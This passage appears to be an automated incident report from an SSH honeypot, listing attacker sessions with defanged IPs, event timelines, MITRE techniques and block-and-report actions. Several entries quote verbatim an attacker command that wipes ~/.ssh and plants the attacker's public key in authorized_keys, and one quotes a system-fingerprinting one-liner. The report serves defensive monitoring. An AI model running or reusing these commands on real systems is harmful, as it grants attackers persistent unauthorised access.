| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:12` | `cowrie.command.failed` |
| `2026-06-30 17:49:44` | `cowrie.log.closed` |
| `2026-06-30 17:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.222.233[.]25` to AbuseIPDB if not already reported
- [ ] Block `73.222.233[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f0087ce03a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 17:49 |
| **Last Seen** | 2026-06-30 17:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:49:15` | `cowrie.session.connect` |
| `2026-06-30 17:49:16` | `cowrie.client.version` |
| `2026-06-30 17:49:16` | `cowrie.client.kex` |
| `2026-06-30 17:49:18` | `cowrie.login.success` |
| `2026-06-30 17:49:20` | `cowrie.session.params` |
| `2026-06-30 17:49:20` | `cowrie.command.input` |
| `2026-06-30 17:49:21` | `cowrie.log.closed` |
| `2026-06-30 17:49:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e12953dba5

| Field | Detail |
|---|---|
| **Source IP** | `124.40.252[.]3` |
| **First Seen** | 2026-06-30 17:53 |
| **Last Seen** | 2026-06-30 17:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:53:12` | `cowrie.session.connect` |
| `2026-06-30 17:53:12` | `cowrie.client.version` |
| `2026-06-30 17:53:13` | `cowrie.client.kex` |
| `2026-06-30 17:53:14` | `cowrie.login.success` |
| `2026-06-30 17:53:15` | `cowrie.session.params` |
| `2026-06-30 17:53:15` | `cowrie.command.input` |
| `2026-06-30 17:53:15` | `cowrie.command.failed` |
| `2026-06-30 17:53:15` | `cowrie.log.closed` |
| `2026-06-30 17:53:16` | `cowrie.session.params` |
| `2026-06-30 17:53:16` | `cowrie.command.input` |
| `2026-06-30 17:53:16` | `cowrie.session.file_download` |
| `2026-06-30 17:53:16` | `cowrie.log.closed` |
| `2026-06-30 17:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.40.252[.]3` to AbuseIPDB if not already reported
- [ ] Block `124.40.252[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec22f29041a5

| Field | Detail |
|---|---|
| **Source IP** | `124.40.252[.]3` |
| **First Seen** | 2026-06-30 17:53 |
| **Last Seen** | 2026-06-30 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:53:17` | `cowrie.session.connect` |
| `2026-06-30 17:53:17` | `cowrie.client.version` |
| `2026-06-30 17:53:17` | `cowrie.client.kex` |
| `2026-06-30 17:53:18` | `cowrie.login.success` |
| `2026-06-30 17:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.40.252[.]3` to AbuseIPDB if not already reported
- [ ] Block `124.40.252[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f692a3819d

| Field | Detail |
|---|---|
| **Source IP** | `124.40.252[.]3` |
| **First Seen** | 2026-06-30 17:53 |
| **Last Seen** | 2026-06-30 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:53:19` | `cowrie.session.connect` |
| `2026-06-30 17:53:19` | `cowrie.client.version` |
| `2026-06-30 17:53:19` | `cowrie.client.kex` |
| `2026-06-30 17:53:20` | `cowrie.login.success` |
| `2026-06-30 17:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.40.252[.]3` to AbuseIPDB if not already reported
- [ ] Block `124.40.252[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77195664b9b0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 17:55 |
| **Last Seen** | 2026-06-30 17:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:55:42` | `cowrie.session.connect` |
| `2026-06-30 17:55:43` | `cowrie.client.version` |
| `2026-06-30 17:55:43` | `cowrie.client.kex` |
| `2026-06-30 17:55:49` | `cowrie.login.success` |
| `2026-06-30 17:55:53` | `cowrie.session.params` |
| `2026-06-30 17:55:53` | `cowrie.command.input` |
| `2026-06-30 17:55:54` | `cowrie.log.closed` |
| `2026-06-30 17:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b8a422ef97

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-06-30 17:55 |
| **Last Seen** | 2026-06-30 17:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:55:43` | `cowrie.session.connect` |
| `2026-06-30 17:55:43` | `cowrie.client.version` |
| `2026-06-30 17:55:43` | `cowrie.client.kex` |
| `2026-06-30 17:55:44` | `cowrie.login.success` |
| `2026-06-30 17:55:45` | `cowrie.session.params` |
| `2026-06-30 17:55:45` | `cowrie.command.input` |
| `2026-06-30 17:55:45` | `cowrie.command.failed` |
| `2026-06-30 17:55:45` | `cowrie.log.closed` |
| `2026-06-30 17:55:46` | `cowrie.session.params` |
| `2026-06-30 17:55:46` | `cowrie.command.input` |
| `2026-06-30 17:55:46` | `cowrie.session.file_download` |
| `2026-06-30 17:55:46` | `cowrie.log.closed` |
| `2026-06-30 17:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e20cf3436c5

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-06-30 17:55 |
| **Last Seen** | 2026-06-30 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:55:46` | `cowrie.session.connect` |
| `2026-06-30 17:55:46` | `cowrie.client.version` |
| `2026-06-30 17:55:47` | `cowrie.client.kex` |
| `2026-06-30 17:55:48` | `cowrie.login.success` |
| `2026-06-30 17:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49852089531e

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-06-30 17:55 |
| **Last Seen** | 2026-06-30 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 17:55:48` | `cowrie.session.connect` |
| `2026-06-30 17:55:48` | `cowrie.client.version` |
| `2026-06-30 17:55:48` | `cowrie.client.kex` |
| `2026-06-30 17:55:49` | `cowrie.login.success` |
| `2026-06-30 17:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b46aa360c5b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 18:05 |
| **Last Seen** | 2026-06-30 18:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:05:48` | `cowrie.session.connect` |
| `2026-06-30 18:05:48` | `cowrie.client.version` |
| `2026-06-30 18:05:48` | `cowrie.client.kex` |
| `2026-06-30 18:05:50` | `cowrie.login.success` |
| `2026-06-30 18:05:52` | `cowrie.session.params` |
| `2026-06-30 18:05:52` | `cowrie.command.input` |
| `2026-06-30 18:05:52` | `cowrie.log.closed` |
| `2026-06-30 18:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef979669a4c1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 18:06 |
| **Last Seen** | 2026-06-30 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:06:18` | `cowrie.session.connect` |
| `2026-06-30 18:06:18` | `cowrie.client.version` |
| `2026-06-30 18:06:18` | `cowrie.client.kex` |
| `2026-06-30 18:06:19` | `cowrie.login.success` |
| `2026-06-30 18:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad8fc5b3449

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 18:06 |
| **Last Seen** | 2026-06-30 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:06:18` | `cowrie.session.connect` |
| `2026-06-30 18:06:18` | `cowrie.client.version` |
| `2026-06-30 18:06:19` | `cowrie.client.kex` |
| `2026-06-30 18:06:19` | `cowrie.login.success` |
| `2026-06-30 18:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5153b9b61c41

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 18:06 |
| **Last Seen** | 2026-06-30 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:06:22` | `cowrie.session.connect` |
| `2026-06-30 18:06:22` | `cowrie.client.version` |
| `2026-06-30 18:06:22` | `cowrie.client.kex` |
| `2026-06-30 18:06:23` | `cowrie.login.success` |
| `2026-06-30 18:06:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ee1bb70e05

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-30 18:06 |
| **Last Seen** | 2026-06-30 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:06:23` | `cowrie.session.connect` |
| `2026-06-30 18:06:23` | `cowrie.client.version` |
| `2026-06-30 18:06:23` | `cowrie.client.kex` |
| `2026-06-30 18:06:23` | `cowrie.login.success` |
| `2026-06-30 18:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488b70899ebe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 18:07 |
| **Last Seen** | 2026-06-30 18:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:07:31` | `cowrie.session.connect` |
| `2026-06-30 18:07:33` | `cowrie.client.version` |
| `2026-06-30 18:07:33` | `cowrie.client.kex` |
| `2026-06-30 18:07:39` | `cowrie.login.success` |
| `2026-06-30 18:07:42` | `cowrie.session.params` |
| `2026-06-30 18:07:42` | `cowrie.command.input` |
| `2026-06-30 18:07:44` | `cowrie.log.closed` |
| `2026-06-30 18:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-322dab768c9b

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-30 18:14 |
| **Last Seen** | 2026-06-30 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:14:37` | `cowrie.session.connect` |
| `2026-06-30 18:14:37` | `cowrie.client.version` |
| `2026-06-30 18:14:37` | `cowrie.client.kex` |
| `2026-06-30 18:14:37` | `cowrie.login.success` |
| `2026-06-30 18:14:38` | `cowrie.session.params` |
| `2026-06-30 18:14:38` | `cowrie.command.input` |
| `2026-06-30 18:14:38` | `cowrie.command.failed` |
| `2026-06-30 18:14:38` | `cowrie.log.closed` |
| `2026-06-30 18:14:38` | `cowrie.session.params` |
| `2026-06-30 18:14:38` | `cowrie.command.input` |
| `2026-06-30 18:14:38` | `cowrie.session.file_download` |
| `2026-06-30 18:14:38` | `cowrie.log.closed` |
| `2026-06-30 18:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28bb8b57cca9

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-30 18:14 |
| **Last Seen** | 2026-06-30 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:14:38` | `cowrie.session.connect` |
| `2026-06-30 18:14:38` | `cowrie.client.version` |
| `2026-06-30 18:14:38` | `cowrie.client.kex` |
| `2026-06-30 18:14:38` | `cowrie.login.success` |
| `2026-06-30 18:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c924df0f648b

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-30 18:14 |
| **Last Seen** | 2026-06-30 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:14:38` | `cowrie.session.connect` |
| `2026-06-30 18:14:38` | `cowrie.client.version` |
| `2026-06-30 18:14:38` | `cowrie.client.kex` |
| `2026-06-30 18:14:38` | `cowrie.login.success` |
| `2026-06-30 18:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a04fe754733

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 18:19 |
| **Last Seen** | 2026-06-30 18:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:19:14` | `cowrie.session.connect` |
| `2026-06-30 18:19:15` | `cowrie.client.version` |
| `2026-06-30 18:19:15` | `cowrie.client.kex` |
| `2026-06-30 18:19:21` | `cowrie.login.success` |
| `2026-06-30 18:19:24` | `cowrie.session.params` |
| `2026-06-30 18:19:24` | `cowrie.command.input` |
| `2026-06-30 18:19:25` | `cowrie.log.closed` |
| `2026-06-30 18:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6746371d18ed

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-06-30 18:21 |
| **Last Seen** | 2026-06-30 18:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:21:34` | `cowrie.session.connect` |
| `2026-06-30 18:21:34` | `cowrie.client.version` |
| `2026-06-30 18:21:34` | `cowrie.client.kex` |
| `2026-06-30 18:21:35` | `cowrie.login.success` |
| `2026-06-30 18:21:36` | `cowrie.session.params` |
| `2026-06-30 18:21:36` | `cowrie.command.input` |
| `2026-06-30 18:21:36` | `cowrie.command.failed` |
| `2026-06-30 18:21:36` | `cowrie.log.closed` |
| `2026-06-30 18:21:37` | `cowrie.session.params` |
| `2026-06-30 18:21:37` | `cowrie.command.input` |
| `2026-06-30 18:21:37` | `cowrie.session.file_download` |
| `2026-06-30 18:21:37` | `cowrie.log.closed` |
| `2026-06-30 18:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df8087cf251

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-06-30 18:21 |
| **Last Seen** | 2026-06-30 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:21:37` | `cowrie.session.connect` |
| `2026-06-30 18:21:37` | `cowrie.client.version` |
| `2026-06-30 18:21:38` | `cowrie.client.kex` |
| `2026-06-30 18:21:38` | `cowrie.login.success` |
| `2026-06-30 18:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d8533ede45

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-06-30 18:21 |
| **Last Seen** | 2026-06-30 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:21:39` | `cowrie.session.connect` |
| `2026-06-30 18:21:39` | `cowrie.client.version` |
| `2026-06-30 18:21:39` | `cowrie.client.kex` |
| `2026-06-30 18:21:40` | `cowrie.login.success` |
| `2026-06-30 18:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84252a7032a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:21 |
| **Last Seen** | 2026-06-30 18:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:21:47` | `cowrie.session.connect` |
| `2026-06-30 18:21:48` | `cowrie.client.version` |
| `2026-06-30 18:21:48` | `cowrie.client.kex` |
| `2026-06-30 18:21:50` | `cowrie.login.success` |
| `2026-06-30 18:21:52` | `cowrie.session.params` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.success` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:52` | `cowrie.command.input` |
| `2026-06-30 18:21:53` | `cowrie.log.closed` |
| `2026-06-30 18:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
